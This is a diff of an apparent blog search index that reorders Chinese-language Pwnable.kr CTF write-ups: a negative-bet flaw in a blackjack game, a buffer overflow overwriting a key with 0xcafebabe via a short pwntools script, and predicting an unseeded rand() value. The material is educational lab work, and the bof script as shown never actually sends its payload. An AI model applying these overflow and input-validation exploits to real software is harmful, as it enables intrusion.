@@ -90,52 +90,6 @@
       </tags>
   </entry>
   <entry>
-    <title>blackjack</title>
-    <url>/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/1.png" class></strong></p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>本题链接打不开了！！！ 只能参考别人的wp</p>
-<p>有两个比较关键的点</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/2.png" class></strong></p>
-<p>判断用户下注的金额如果大于用户拥有的金额，则会提示用户不能下注，但程序的漏洞在于如果输入的金额是负数，会直接通过，并且返回输入的下注金额。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/3.png" class></strong></p>
-<p>如果用户输了，则会扣除用户下注的金额，这里使用简单的减法操作，结合前面下注金额可以为负数，则直接输入一个很大的负数，之后故意输掉比赛，使得金额超过阈值拿到flag。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/4.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bof</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/4.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/1.png" class></strong></p>
-<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/2.png" class></strong></p>
-<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
-<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/3.png" class></strong></p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>阅读深度学习的对抗攻击方法综述及实例</title>
     <url>/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/0.png" class></strong></p>
@@ -193,6 +147,52 @@
       </categories>
       <tags>
         <tag>AI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>blackjack</title>
+    <url>/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/1.png" class></strong></p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>本题链接打不开了！！！ 只能参考别人的wp</p>
+<p>有两个比较关键的点</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/2.png" class></strong></p>
+<p>判断用户下注的金额如果大于用户拥有的金额，则会提示用户不能下注，但程序的漏洞在于如果输入的金额是负数，会直接通过，并且返回输入的下注金额。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/3.png" class></strong></p>
+<p>如果用户输了，则会扣除用户下注的金额，这里使用简单的减法操作，结合前面下注金额可以为负数，则直接输入一个很大的负数，之后故意输掉比赛，使得金额超过阈值拿到flag。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/4.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bof</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/4.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/1.png" class></strong></p>
+<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/2.png" class></strong></p>
+<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
+<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/3.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
       </tags>
   </entry>
   <entry>
@@ -451,6 +451,33 @@
       </tags>
   </entry>
   <entry>
+    <title>random</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/1.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/2.png" class></strong></p>
+<h3 id="查看random-c源代码"><a href="#查看random-c源代码" class="headerlink" title="查看random.c源代码"></a>查看random.c源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/3.png" class></strong></p>
+<p>函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于$0xdeadbeef$，则可以执行system函数，拿到flag。</p>
+<h3 id="rand（）函数"><a href="#rand（）函数" class="headerlink" title="rand（）函数"></a>rand（）函数</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/4.png" class></strong></p>
+<p>由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。</p>
+<h3 id="查看随机数"><a href="#查看随机数" class="headerlink" title="查看随机数"></a>查看随机数</h3><h4 id="disassemble-r-main-查看汇编代码"><a href="#disassemble-r-main-查看汇编代码" class="headerlink" title="$disassemble /r \ main$查看汇编代码"></a>$disassemble /r \ main$查看汇编代码</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/5.png" class></strong></p>
+<h4 id="在cmp处下断点"><a href="#在cmp处下断点" class="headerlink" title="在cmp处下断点"></a>在cmp处下断点</h4><p>汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为$rbp-4$（先压入栈中），因此使用$x/10x \ $rbp-4$查看内存的值即可。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/6.png" class></strong></p>
+<p>所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>求出$0x6b8b4567\oplus 0xdeadbeef$的值输入即可</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/7.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>shellshock</title>
     <url>/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/0.png" class></strong></p>
@@ -477,33 +504,6 @@
 <p>关于shellshock漏洞相关知识可参考：</p>
 <p>1、<a href="https://www.baidu.com/link?url=3yWq37n7Y_LHRUa2L-iudGGqqgT-6s4gKmaU0_hOQBDFSacVZ_bxZqpA999gplxb_gOwXfn9XSE9mE53bYkDBK&wd=&eqid=e40eff4200053949000000035aa32eda">关于<em>ShellShock</em>漏洞的利用过程和原理解析 - CSDN博客</a></p>
 <p>2、<a href="http://www.freebuf.com/articles/system/45390.html">破壳（ShellShock）漏洞样本分析报告</a></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>random</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/1.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/2.png" class></strong></p>
-<h3 id="查看random-c源代码"><a href="#查看random-c源代码" class="headerlink" title="查看random.c源代码"></a>查看random.c源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/3.png" class></strong></p>
-<p>函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于$0xdeadbeef$，则可以执行system函数，拿到flag。</p>
-<h3 id="rand（）函数"><a href="#rand（）函数" class="headerlink" title="rand（）函数"></a>rand（）函数</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/4.png" class></strong></p>
-<p>由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。</p>
-<h3 id="查看随机数"><a href="#查看随机数" class="headerlink" title="查看随机数"></a>查看随机数</h3><h4 id="disassemble-r-main-查看汇编代码"><a href="#disassemble-r-main-查看汇编代码" class="headerlink" title="$disassemble /r \ main$查看汇编代码"></a>$disassemble /r \ main$查看汇编代码</h4><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/5.png" class></strong></p>
-<h4 id="在cmp处下断点"><a href="#在cmp处下断点" class="headerlink" title="在cmp处下断点"></a>在cmp处下断点</h4><p>汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为$rbp-4$（先压入栈中），因此使用$x/10x \ $rbp-4$查看内存的值即可。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/6.png" class></strong></p>
-<p>所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>求出$0x6b8b4567\oplus 0xdeadbeef$的值输入即可</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/7.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
